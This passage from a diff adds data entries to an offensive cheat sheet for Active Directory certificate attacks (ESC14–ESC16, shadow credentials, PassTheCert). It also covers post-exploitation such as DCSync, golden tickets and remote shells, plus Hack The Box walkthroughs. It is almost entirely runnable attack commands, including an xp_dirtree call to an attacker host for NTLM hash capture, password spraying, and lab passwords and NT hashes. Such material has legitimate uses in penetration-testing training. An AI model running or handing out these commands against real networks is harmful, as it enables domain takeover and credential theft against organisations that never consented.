+{num:3,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP} -username ${TARGET_USER} -domain ${DOMAIN}',src:'certipy auth',tags:['linux'],label:'Scenario B Step 3: auth as mapped user'},
+{type:'sub',label:'Scenario A: Write strong X509 mapping to target'},
+{num:4,cmd:'certipy cert -pfx ${PFX_FILE} -text | grep -E "Issuer|Serial"',src:'get cert info',tags:['linux'],label:'Get Issuer DN and Serial for mapping'},
+{num:5,cmd:'bloodyAD -d ${DOMAIN} -u ${USERNAME} -p "${PASSWORD}" --host ${DC_IP} set object ${TARGET_USER} altSecurityIdentities -v "X509:<I>DC=local,DC=corp,CN=${CA_NAME}<SR>REVERSED_SERIAL_HEX"',src:'write mapping A',tags:['linux'],label:'Scenario A: write X509 strong mapping (reverse serial bytes!)'},
+{num:6,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP} -username ${TARGET_USER} -domain ${DOMAIN}',src:'certipy auth A',tags:['linux']},
+{type:'desc',cls:'tip',text:'<strong>Serial reversal for Scenario A:</strong> openssl x509 -in cert.crt -noout -serial gives "11:00:43:AB". Reversed = "AB430011" (byte-by-byte reversal, uppercase hex, no separators).'}
+]},
+{phase:16,phaseName:'ESC15: EKUwu Schema V1 Templates',shortName:'ESC15',color:'#6366f1',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC15 Conditions (CVE-2024-49019):</strong> Template Schema Version=1 + Enrollee Supplies Subject. Default vulnerable: WebServer, CrossCertificationAuthority. Certipy >= 5.0 required. HTB TombWatcher. Patched Nov 2024.'},
+{num:1,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout | grep -A5 "ESC15"',src:'certipy detect',tags:['linux'],label:'Detect: Schema Version: 1 + Enrollee Supplies Subject'},
+{num:2,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
+{type:'sub',label:'Path B: Chain to ESC3 - Inject Certificate Request Agent OID (RECOMMENDED)'},
+{num:3,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}" -application-policies "1.3.6.1.4.1.311.20.2.1"',src:'certipy req ESC15-B',tags:['linux'],label:'Path B Step 1: inject CRA OID into Schema v1 template'},
+{num:4,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template User -pfx ${USERNAME}.pfx -on-behalf-of "${DOMAIN_SHORT}\\\\${TARGET_USER}"',src:'certipy OBO',tags:['linux'],label:'Path B Step 2: use as agent, request on-behalf-of admin'},
+{num:5,cmd:'certipy auth -pfx ${TARGET_USER}.pfx -dc-ip ${DC_IP}',src:'certipy auth',tags:['linux']},
+{type:'sub',label:'Path A: Direct Client Auth injection (may fail with CA_MD_TOO_WEAK)'},
+{num:6,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}" -upn ${TARGET_UPN} -sid ${TARGET_SID} -application-policies "Client Authentication"',src:'certipy req ESC15-A',tags:['linux'],label:'Path A: direct Client Auth (use Path B if this fails)'},
+{type:'desc',cls:'tip',text:'<strong>TombWatcher AD Recycle Bin recovery:</strong> Get-ADObject -Filter "isDeleted -eq $true" -IncludeDeletedObjects | Restore-ADObject; Enable-ADAccount cert_admin; Set-ADAccountPassword -Reset'},
+{type:'desc',cls:'warn',text:'<strong>TOP FAILURES:</strong> 1) Path A fails with CA_MD_TOO_WEAK -> use Path B | 2) Certipy version < 5.0 (ESC15 not detected) | 3) Template is Schema v2 (ESC15 does NOT apply) | 4) AD Recycle Bin not enabled on TombWatcher'}
+]},
+{phase:17,phaseName:'ESC16: Security Extension Disabled',shortName:'ESC16',color:'#8b5cf6',items:[
+{type:'desc',cls:'warn',text:'<strong>ESC16 Conditions:</strong> CA has szOID_NTDS_CA_SECURITY_EXT (1.3.6.1.4.1.311.25.2) in DisableExtensionList. ALL certs lack SID extension. ANY client-auth template works. HTB Fluffy machine. Certipy >= 5.0.2 required.'},
+{type:'desc',cls:'warn',text:'<strong>FLUFFY CRITICAL: faketime required throughout. Clock sync via ntpdate drops VPN on some boxes.</strong>'},
+{num:1,cmd:'certutil -config "${DC_FQDN}\\\\${CA_NAME}" -getreg policy\\\\DisableExtensionList',src:'certutil detect',tags:['win'],label:'Detect: look for 1.3.6.1.4.1.311.25.2 in list'},
+{num:2,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -vulnerable -stdout | grep -i "ESC16\\|DisableExtension"',src:'certipy detect',tags:['linux']},
+{num:3,cmd:'ntpdate -q ${DC_IP} | head -1',src:'get DC time',tags:['linux'],label:'Get DC time for faketime'},
+{num:4,cmd:'faketime "$(ntpdate -q ${DC_IP} | head -1 | awk \'{print $1,$2}\')" certipy account read -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER}',src:'faketime read',tags:['linux'],label:'STEP 1: Read victim UPN (with faketime)'},
+{num:5,cmd:'faketime "$(ntpdate -q ${DC_IP} | head -1 | awk \'{print $1,$2}\')" certipy shadow auto -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -account ${VICTIM_USER}',src:'faketime shadow',tags:['linux'],label:'STEP 2: Get victim hash via shadow creds'},
+{num:6,cmd:'faketime "$(ntpdate -q ${DC_IP} | head -1 | awk \'{print $1,$2}\')" certipy account update -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER} -upn ${TARGET_USER}',src:'faketime update UPN',tags:['linux'],label:'STEP 3: Flip UPN to bare "administrator"'},
+{num:7,cmd:'faketime "$(ntpdate -q ${DC_IP} | head -1 | awk \'{print $1,$2}\')" certipy req -u ${VICTIM_USER}@${DOMAIN} -hashes :${VICTIM_HASH} -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template User',src:'faketime req',tags:['linux'],label:'STEP 4: Request cert (any client-auth template)'},
+{num:8,cmd:'faketime "$(ntpdate -q ${DC_IP} | head -1 | awk \'{print $1,$2}\')" certipy account update -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${VICTIM_USER} -upn ${VICTIM_USER}@${DOMAIN}',src:'faketime restore',tags:['linux'],label:'STEP 5: RESTORE UPN (mandatory)'},
+{num:9,cmd:'faketime "$(ntpdate -q ${DC_IP} | head -1 | awk \'{print $1,$2}\')" certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP} -username ${TARGET_USER} -domain ${DOMAIN}',src:'faketime auth',tags:['linux'],label:'STEP 6: Auth with faketime'}
+]},
+{phase:18,phaseName:'Shadow Credentials',shortName:'Shadow',color:'#06b6d4',items:[
+{type:'desc',cls:'info',text:'<strong>Shadow Credentials (AddKeyCredentialLink):</strong> Write msDS-KeyCredentialLink on target -> embed public key -> PKINIT as them -> get NT hash. DC functional level 2016+ required. Used before ESC9/10/16.'},
+{num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux']},
+{num:2,cmd:'certipy shadow auto -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -account ${VICTIM_USER}',src:'certipy shadow auto',tags:['linux'],label:'One-shot: add + auth + get NT hash + cleanup'},
+{num:3,cmd:'certipy shadow auto -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -account "${VICTIM_USER}$"',src:'certipy shadow machine',tags:['linux','alt'],label:'Machine account (add $ suffix)'},
+{num:4,cmd:'certipy shadow add -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -account ${VICTIM_USER} -out persist',src:'shadow add',tags:['linux'],label:'Manual: add shadow credential'},
+{num:5,cmd:'certipy shadow remove -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -account ${VICTIM_USER} -device-id DEVICE_GUID',src:'shadow remove',tags:['linux'],label:'Remove specific entry (cleanup)'},
+{type:'sub',label:'Alternative: pywhisker + PKINITtools'},
+{num:6,cmd:'python3 pywhisker.py -d ${DOMAIN} -u ${USERNAME} -p "${PASSWORD}" --target ${VICTIM_USER} --action add -e PFX -P "PfxPass" -f victim_shadow',src:'pywhisker',tags:['linux','alt']},
+{num:7,cmd:'python3 gettgtpkinit.py -cert-pfx victim_shadow.pfx -pfx-pass "PfxPass" ${DOMAIN}/${VICTIM_USER} victim.ccache',src:'gettgtpkinit',tags:['linux','alt']},
+{num:8,cmd:'python3 getnthash.py -key AS_REP_HEX_FROM_ABOVE ${DOMAIN}/${VICTIM_USER}',src:'getnthash',tags:['linux','alt']},
+{type:'sub',label:'Alternative: Whisker.exe (Windows)'},
+{num:9,cmd:'Whisker.exe add /target:${VICTIM_USER} /domain:${DOMAIN} /dc:${DC_FQDN} /path:out.pfx /password:"PfxPass"',src:'Whisker.exe',tags:['win','alt'],label:'Also prints Rubeus command to use'},
+{num:10,cmd:'impacket-ntlmrelayx -t ldaps://${DC_IP} --shadow-credentials --shadow-target ${VICTIM_USER} -smb2support',src:'ntlmrelayx shadow',tags:['linux','alt'],label:'Relay to LDAPS for shadow creds'}
+]},
+{phase:19,phaseName:'PassTheCert: PKINIT Fallback',shortName:'PtC',color:'#14b8a6',items:[
+{type:'desc',cls:'warn',text:'<strong>Use PassTheCert when:</strong> certipy auth gives KDC_ERR_PADATA_TYPE_NOSUPP. DC has no PKINIT cert. Authority machine is the prime example.'},
+{num:1,cmd:'certipy cert -pfx ${PFX_FILE} -nokey -out ${PFX_FILE%.pfx}.crt',src:'extract crt',tags:['linux'],label:'STEP 1a: Extract certificate'},
+{num:2,cmd:'certipy cert -pfx ${PFX_FILE} -nocert -out ${PFX_FILE%.pfx}.key',src:'extract key',tags:['linux'],label:'STEP 1b: Extract private key'},
+{num:3,cmd:'python3 passthecert.py -action whoami -crt ${PFX_FILE%.pfx}.crt -key ${PFX_FILE%.pfx}.key -domain ${DOMAIN} -dc-ip ${DC_IP}',src:'whoami',tags:['linux'],label:'STEP 2: Verify it works'},
+{num:4,cmd:'python3 passthecert.py -action ldap-shell -crt ${PFX_FILE%.pfx}.crt -key ${PFX_FILE%.pfx}.key -domain ${DOMAIN} -dc-ip ${DC_IP}',src:'ldap-shell',tags:['linux'],label:'STEP 3: Interactive LDAP shell'},
+{type:'desc',cls:'tip',text:'<strong>LDAP shell commands:</strong> add_user_to_group USER "Domain Admins" | change_password USER NewPass! | set_rbcd TARGET GRANTEE | get_laps_password COMPUTER | grant_control TARGET GRANTEE | whoami'},
+{num:5,cmd:'python3 passthecert.py -action modify_user -crt ${PFX_FILE%.pfx}.crt -key ${PFX_FILE%.pfx}.key -domain ${DOMAIN} -dc-ip ${DC_IP} -target ${USERNAME} -elevate',src:'elevate DA',tags:['linux'],label:'Grant DCSync rights to yourself'},
+{num:6,cmd:'python3 passthecert.py -action modify_user -crt ${PFX_FILE%.pfx}.crt -key ${PFX_FILE%.pfx}.key -domain ${DOMAIN} -dc-ip ${DC_IP} -target ${VICTIM_USER} -new-pass "NewP@ss123!"',src:'reset password',tags:['linux']},
+{num:7,cmd:'python3 passthecert.py -action add_computer -crt ${PFX_FILE%.pfx}.crt -key ${PFX_FILE%.pfx}.key -domain ${DOMAIN} -dc-ip ${DC_IP} -computer-name "${COMPUTER_NAME}" -computer-pass "${COMPUTER_PASS}"',src:'add computer',tags:['linux']},
+{type:'sub',label:'Alternative: certipy -ldap-shell (no conversion needed)'},
+{num:8,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP} -ldap-shell',src:'certipy ldap-shell',tags:['linux','alt']},
+{type:'sub',label:'Windows: PassTheCert.exe'},
+{num:9,cmd:'PassTheCert.exe --server ${DC_FQDN} --cert-path ${PFX_FILE} --elevate --target "DC=${DOMAIN}" --sid ATTACKER_SID',src:'PassTheCert.exe',tags:['win','alt']}
+]},
+{phase:20,phaseName:'Post-Exploitation',shortName:'PostEx',color:'#f59e0b',items:[
+{type:'desc',cls:'success',text:'<strong>You have NT hash + TGT. Now take full domain control.</strong>'},
+{type:'sub',label:'DCSync - dump all domain hashes'},
+{num:1,cmd:'impacket-secretsdump -hashes :${NTHASH} "${DOMAIN}/${TARGET_USER}@${DC_FQDN}" -just-dc',src:'secretsdump',tags:['linux'],label:'DCSync primary'},
+{num:2,cmd:'export KRB5CCNAME=${PFX_FILE%.pfx}.ccache && impacket-secretsdump -k -no-pass -just-dc ${DOMAIN}/${TARGET_USER}@${DC_FQDN}',src:'secretsdump Kerberos',tags:['linux','alt'],label:'DCSync with TGT'},
+{num:3,cmd:'nxc smb ${DC_IP} -u ${TARGET_USER} -H ${NTHASH} --ntds vss',src:'nxc ntds',tags:['linux','alt'],label:'VSS-based NTDS dump'},
+{type:'sub',label:'Interactive shells'},
+{num:4,cmd:'evil-winrm -i ${DC_IP} -u ${TARGET_USER} -H ${NTHASH}',src:'evil-winrm',tags:['linux']},
+{num:5,cmd:'evil-winrm -i ${DC_IP} -c ${PFX_FILE%.pfx}.crt -k ${PFX_FILE%.pfx}.key -S -P 5986',src:'evil-winrm cert',tags:['linux','alt'],label:'WinRM with cert directly'},
+{num:6,cmd:'impacket-psexec "${DOMAIN}/${TARGET_USER}@${DC_IP}" -hashes :${NTHASH}',src:'psexec',tags:['linux']},
+{num:7,cmd:'impacket-wmiexec -k -no-pass "${DOMAIN}/${TARGET_USER}@${DC_FQDN}"',src:'wmiexec',tags:['linux','alt']},
+{type:'sub',label:'Persistence'},
+{num:8,cmd:'impacket-secretsdump -hashes :${NTHASH} "${DOMAIN}/${TARGET_USER}@${DC_IP}" -just-dc-user "krbtgt"',src:'dump krbtgt',tags:['linux'],label:'Get KRBTGT for Golden Ticket'},
+{num:9,cmd:'impacket-ticketer -nthash KRBTGT_HASH -domain-sid DOMAIN_SID -domain ${DOMAIN} -spn "krbtgt/${DOMAIN}" Administrator',src:'golden ticket',tags:['linux']},
+{type:'sub',label:'Read proof flags'},
+{num:10,cmd:'evil-winrm -i ${DC_IP} -u ${TARGET_USER} -H ${NTHASH} -e . && type C:\\Users\\Administrator\\Desktop\\proof.txt',src:'proof flag',tags:['win']}
+]},
+{phase:21,phaseName:'Fix Errors and Troubleshooting',shortName:'Fix-Errors',color:'#ef4444',items:[
+{type:'desc',cls:'warn',text:'<strong>90% of ADCS failures: 1) Clock skew 2) Missing -sid 3) PKINIT not supported 4) Wrong CA format 5) Template name typo.</strong> Check these first.'},
+{type:'sub',label:'Clock Skew Fixes'},
+{num:1,cmd:'sudo ntpdate -u ${DC_IP}',src:'ntpdate',tags:['linux'],label:'Method 1: ntpdate (may drop VPN connection)'},
+{num:2,cmd:'sudo rdate -n ${DC_IP}',src:'rdate',tags:['linux','alt'],label:'Method 2: rdate'},
+{num:3,cmd:'faketime "$(ntpdate -q ${DC_IP} | head -1 | awk \'{print $1,$2}\')" certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP}',src:'faketime',tags:['linux'],label:'Method 3: faketime (no VPN drop, recommended)'},
+{num:4,cmd:'sudo chronyd -q "server ${DC_IP} iburst"',src:'chronyd',tags:['linux','alt']},
+{type:'sub',label:'KDC_ERR_PADATA_TYPE_NOSUPP (padata type not supported)'},
+{type:'desc',cls:'info',text:'<strong>DC has no PKINIT cert. Use Schannel/LDAPS instead of Kerberos.</strong>'},
+{num:5,cmd:'certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP} -ldap-shell',src:'ldap-shell',tags:['linux'],label:'Fallback 1: Schannel LDAP shell'},
+{num:6,cmd:'certipy cert -pfx ${PFX_FILE} -nokey -out admin.crt && certipy cert -pfx ${PFX_FILE} -nocert -out admin.key && python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain ${DOMAIN} -dc-ip ${DC_IP}',src:'passthecert',tags:['linux'],label:'Fallback 2: PassTheCert'},
+{type:'sub',label:'KDC_ERR_CERTIFICATE_MISMATCH (Object SID mismatch)'},
+{num:7,cmd:'certipy account read -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -user ${TARGET_USER}',src:'get SID',tags:['linux'],label:'Step 1: Get TARGET_SID and fill variable above'},
+{num:8,cmd:'certipy req -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -target ${CA_HOST} -ca "${CA_NAME}" -template "${TEMPLATE}" -upn ${TARGET_UPN} -sid ${TARGET_SID}',src:'req with SID',tags:['linux'],label:'Step 2: Re-request with -sid flag'},
+{type:'sub',label:'LDAP strongerAuthRequired / Channel Binding'},
+{num:9,cmd:'pip install --force-reinstall git+https://github.com/ly4k/ldap3 --break-system-packages && certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -no-ldap-channel-binding -no-ldap-signing',src:'fix ldap3',tags:['linux']},
+{num:10,cmd:'certipy find -u ${USERNAME}@${DOMAIN} -p "${PASSWORD}" -dc-ip ${DC_IP} -scheme ldap',src:'switch ldap',tags:['linux','alt'],label:'Switch to LDAP port 389'},
+{type:'sub',label:'OpenSSL / Format Fixes'},
+{num:11,cmd:'openssl pkcs12 -in ${PFX_FILE} -out cert.pem -nodes -legacy',src:'openssl legacy',tags:['linux'],label:'OpenSSL 3 legacy PFX (RC2 encrypted)'},
+{num:12,cmd:'openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ${PFX_FILE} -passout pass:',src:'openssl PFX Rubeus',tags:['linux'],label:'PFX for Rubeus (requires specific CSP!)'},
+{num:13,cmd:'cat ${PFX_FILE} | base64 -w0 > ${PFX_FILE%.pfx}.b64',src:'base64 PFX',tags:['linux'],label:'PFX to base64 for Rubeus'},
+{type:'sub',label:'Kerberos Resolution Fixes'},
+{num:14,cmd:'echo "${DC_IP}  ${DC_FQDN} ${DOMAIN}" | sudo tee -a /etc/hosts && echo "${DC_IP}  ${CA_HOST}" | sudo tee -a /etc/hosts',src:'etc/hosts',tags:['linux'],label:'Add DNS entries'},
+{num:15,cmd:'export KRB5_TRACE=/dev/stderr && certipy auth -pfx ${PFX_FILE} -dc-ip ${DC_IP}',src:'kerberos debug',tags:['linux'],label:'Debug Kerberos failures'},
+{type:'sub',label:'Certipy Version Issues'},
+{num:16,cmd:'certipy --version',src:'version check',tags:['linux'],label:'ESC13>=4.8.2 | ESC15>=5.0 | ESC16>=5.0.2'},
+{num:17,cmd:'pip install --force-reinstall certipy-ad==5.0.2 --break-system-packages',src:'pin version',tags:['linux']}
+]},
+{phase:22,phaseName:'Machine Walkthroughs',shortName:'Machines',color:'#64748b',items:[
+{type:'desc',cls:'info',text:'<strong>Machine walkthroughs. Fill variables above for auto-filled commands.</strong>'},
+{type:'sub',label:'HTB Escape (10.10.11.202) - ESC1 - Template: UserAuthentication - CA: sequel-DC-CA'},
+{num:1,cmd:'sudo ntpdate -u 10.10.11.202',src:'Setup',tags:['linux'],label:'ALWAYS sync time first'},
+{num:2,cmd:'impacket-mssqlclient "PublicUser:GuestUserCantWrite1@10.10.11.202" -windows-auth',src:'MSSQL login',tags:['linux'],label:'Foothold: SMB Public share has SQL_Procedures.pdf'},
+{num:3,cmd:'EXEC xp_dirtree "\\\\\\\\${ATTACKER_IP}\\\\share", 1, 1',src:'xp_dirtree',tags:['win'],label:'Trigger NTLMv2 capture in MSSQL'},
+{num:4,cmd:'sudo responder -I ${IFACE}',src:'Responder',tags:['linux'],label:'Capture sql_svc NTLMv2 hash'},
+{num:5,cmd:'hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt --force',src:'hashcat',tags:['linux'],label:'Crack -> REGGIE1234ronnie'},
+{num:6,cmd:'evil-winrm -i 10.10.11.202 -u sql_svc -p "REGGIE1234ronnie"',src:'WinRM sql_svc',tags:['linux'],label:'Get ryan.cooper creds from SQLServer\\Log\\ERRORLOG.BAK'},
+{num:7,cmd:'certipy req -u ryan.cooper@sequel.htb -p "NuclearMosquito3" -dc-ip 10.10.11.202 -target sequel.htb -ca "sequel-DC-CA" -template "UserAuthentication" -upn administrator@sequel.htb -sid S-1-5-21-4078382237-1492182817-2568127532-500',src:'ESC1 req',tags:['linux'],label:'ESC1: request cert as administrator'},
+{num:8,cmd:'certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202',src:'Auth',tags:['linux'],label:'Get administrator NT hash'},
+{num:9,cmd:'evil-winrm -i 10.10.11.202 -u administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE',src:'Shell',tags:['linux']},
+{type:'sub',label:'HTB Manager (10.10.11.236) - ESC7 - Template: SubCA - CA: manager-DC01-CA'},
+{type:'desc',cls:'warn',text:'CLEANUP SCRIPT EVERY ~10MIN. Script the full chain. Note REQUEST_ID when request is denied.'},
+{num:10,cmd:'nxc smb 10.10.11.236 -u "guest" -p "" --rid-brute 10000 | grep "SidTypeUser"',src:'RID brute',tags:['linux'],label:'Foothold: RID brute for usernames'},
+{num:11,cmd:'nxc smb 10.10.11.236 -u users.txt -p users.txt --no-bruteforce --continue-on-success 2>/dev/null | grep "+"',src:'password spray',tags:['linux'],label:'User=Pass spray -> operator:operator'},
+{num:12,cmd:'impacket-mssqlclient "manager.htb/operator:operator@10.10.11.236" -windows-auth',src:'MSSQL',tags:['linux']},
+{num:13,cmd:'EXEC xp_dirtree "C:\\\\inetpub\\\\wwwroot", 1, 1',src:'xp_dirtree',tags:['win'],label:'Find website-backup-27-07-23-old.zip -> raven:R4v3nBe5tD3veloP3r!123'},
+{num:14,cmd:'certipy ca -u raven@manager.htb -p "R4v3nBe5tD3veloP3r!123" -dc-ip 10.10.11.236 -target dc01.manager.htb -ca "manager-DC01-CA" -add-officer raven',src:'ESC7 step1',tags:['linux']},
+{num:15,cmd:'certipy ca -u raven@manager.htb -p "R4v3nBe5tD3veloP3r!123" -dc-ip 10.10.11.236 -target dc01.manager.htb -ca "manager-DC01-CA" -enable-template SubCA',src:'ESC7 step2',tags:['linux']},
+{num:16,cmd:'certipy req -u raven@manager.htb -p "R4v3nBe5tD3veloP3r!123" -dc-ip 10.10.11.236 -target dc01.manager.htb -ca "manager-DC01-CA" -template SubCA -upn administrator@manager.htb',src:'ESC7 step3',tags:['linux'],label:'DENIED - note REQUEST_ID in output, save .key file!'},
+{num:17,cmd:'certipy ca -u raven@manager.htb -p "R4v3nBe5tD3veloP3r!123" -dc-ip 10.10.11.236 -target dc01.manager.htb -ca "manager-DC01-CA" -issue-request ${REQUEST_ID}',src:'ESC7 step4',tags:['linux']},
+{num:18,cmd:'certipy req -u raven@manager.htb -p "R4v3nBe5tD3veloP3r!123" -dc-ip 10.10.11.236 -target dc01.manager.htb -ca "manager-DC01-CA" -retrieve ${REQUEST_ID}',src:'ESC7 step5',tags:['linux']},
+{num:19,cmd:'certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236',src:'Auth',tags:['linux']},
+{type:'sub',label:'HTB Certified (10.10.11.41) - ESC9 - Template: CertifiedAuthentication - CA: certified-DC01-CA'},
+{num:20,cmd:'sudo ntpdate -u 10.10.11.41',src:'Setup',tags:['linux']},
+{num:21,cmd:'python3 owneredit.py -action write -new-owner judith.mader -target-dn "CN=Management,CN=Users,DC=certified,DC=htb" -dc-ip 10.10.11.41 "certified.htb/judith.mader:judith09"',src:'owneredit',tags:['linux'],label:'Take ownership of Management group'},
+{num:22,cmd:'python3 dacledit.py -action write -rights WriteMembers -principal judith.mader -target-dn "CN=Management,CN=Users,DC=certified,DC=htb" -dc-ip 10.10.11.41 "certified.htb/judith.mader:judith09"',src:'dacledit',tags:['linux'],label:'Grant WriteMembers to judith'},
+{num:23,cmd:'certipy shadow auto -u judith.mader@certified.htb -p "judith09" -dc-ip 10.10.11.41 -account management_svc',src:'shadow mgmt_svc',tags:['linux'],label:'Get management_svc hash (via Management group GenericAll)'},
+{num:24,cmd:'certipy shadow auto -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.10.11.41 -account ca_operator',src:'shadow ca_operator',tags:['linux'],label:'Get ca_operator hash'},
+{num:25,cmd:'certipy account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.10.11.41 -user ca_operator -upn Administrator',src:'ESC9 flip UPN',tags:['linux'],label:'ESC9: set ca_operator UPN to bare "Administrator"'},
+{num:26,cmd:'certipy req -u ca_operator@certified.htb -hashes :b4b86f45c6018f1b664f70805f45d8f2 -dc-ip 10.10.11.41 -ca "certified-DC01-CA" -template "CertifiedAuthentication"',src:'ESC9 req',tags:['linux']},
+{num:27,cmd:'certipy account update -u management_svc@certified.htb -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.10.11.41 -user ca_operator -upn ca_operator@certified.htb',src:'RESTORE UPN',tags:['linux'],label:'RESTORE UPN immediately!'},
+{num:28,cmd:'certipy auth -pfx administrator.pfx -dc-ip 10.10.11.41 -domain certified.htb -username administrator',src:'Auth',tags:['linux']},
+{type:'sub',label:'HTB EscapeTwo - ESC4 -> ESC1 - Template: DunderMifflinAuthentication - CA: sequel-DC01-CA'},
+{num:29,cmd:'certipy shadow auto -u ryan.cooper@sequel.htb -p "WqSZAF6CysDQbGb3" -dc-ip ${DC_IP} -account ca_svc',src:'shadow ca_svc',tags:['linux'],label:'Get ca_svc hash (ca_svc has WriteDacl on template)'},
+{num:30,cmd:'certipy template -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip ${DC_IP} -template "DunderMifflinAuthentication" -save-configuration DunderMifflin_backup.json',src:'backup template',tags:['linux']},
+{num:31,cmd:'certipy template -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip ${DC_IP} -template "DunderMifflinAuthentication" -write-default-configuration -force',src:'ESC4 modify',tags:['linux']},
+{num:32,cmd:'certipy req -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip ${DC_IP} -target "dc01.sequel.htb" -ca "sequel-DC01-CA" -template "DunderMifflinAuthentication" -upn "administrator@sequel.htb" -sid S-1-5-21-...-500',src:'ESC1 req',tags:['linux'],label:'Update TARGET_SID variable with correct SID'},
+{num:33,cmd:'certipy auth -pfx administrator.pfx -dc-ip ${DC_IP}',src:'Auth',tags:['linux']},
+{num:34,cmd:'certipy template -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip ${DC_IP} -template "DunderMifflinAuthentication" -write-configuration DunderMifflin_backup.json -no-save',src:'RESTORE template',tags:['linux'],label:'MANDATORY: restore template'},
+{type:'sub',label:'HTB Authority - ESC1 + MAQ - Template: CorpVPN - CA: AUTHORITY-CA (PKINIT fails -> PassTheCert)'},
+{num:35,cmd:'nxc ldap 10.10.11.222 -u svc_ldap -p "lDaP_1n_th3_cle4r!" -M maq',src:'check MAQ',tags:['linux'],label:'Verify MAQ=10 (svc_ldap from Ansible vault)'},
+{num:36,cmd:'impacket-addcomputer "authority.htb/svc_ldap:lDaP_1n_th3_cle4r!" -method LDAPS -dc-ip 10.10.11.222 -computer-name "EVIL$" -computer-pass "EvilP@ss123"',src:'addcomputer',tags:['linux']},
+{num:37,cmd:'certipy req -u "EVIL$@authority.htb" -p "EvilP@ss123" -ca "AUTHORITY-CA" -dc-ip 10.10.11.222 -target 10.10.11.222 -template "CorpVPN" -upn "administrator@authority.htb" -dns "authority.htb" -sid S-1-5-21-...-500',src:'ESC1 req',tags:['linux'],label:'PKINIT will fail after this - use PassTheCert'},
+{num:38,cmd:'certipy cert -pfx administrator.pfx -nokey -out admin.crt && certipy cert -pfx administrator.pfx -nocert -out admin.key',src:'extract crt+key',tags:['linux']},
+{num:39,cmd:'python3 passthecert.py -action ldap-shell -crt admin.crt -key admin.key -domain authority.htb -dc-ip 10.10.11.222',src:'ldap-shell',tags:['linux'],label:'LDAP shell -> add_user_to_group svc_ldap "Domain Admins"'},
+{type:'sub',label:'HTB Fluffy - ESC16 - Template: User - CA: fluffy-DC01-CA'},
+{num:40,cmd:'bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p "prometheusx-303" add groupMember "Service Accounts" p.agila',src:'add to group',tags:['linux'],label:'p.agila from CVE-2025-24071 .library-ms + Responder'},
+{num:41,cmd:'DCTIME=$(ntpdate -q 10.10.11.69 | head -1 | awk \'{print $1,$2}\') && faketime "$DCTIME" certipy shadow auto -u p.agila@fluffy.htb -p "prometheusx-303" -dc-ip 10.10.11.69 -account ca_svc',src:'shadow ca_svc',tags:['linux']},
+{num:42,cmd:'DCTIME=$(ntpdate -q 10.10.11.69 | head -1 | awk \'{print $1,$2}\') && faketime "$DCTIME" certipy account update -u p.agila@fluffy.htb -p "prometheusx-303" -dc-ip 10.10.11.69 -user ca_svc -upn administrator',src:'ESC16 flip UPN',tags:['linux']},
+{num:43,cmd:'DCTIME=$(ntpdate -q 10.10.11.69 | head -1 | awk \'{print $1,$2}\') && faketime "$DCTIME" certipy req -u ca_svc@fluffy.htb -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca "fluffy-DC01-CA" -template User',src:'ESC16 req',tags:['linux']},
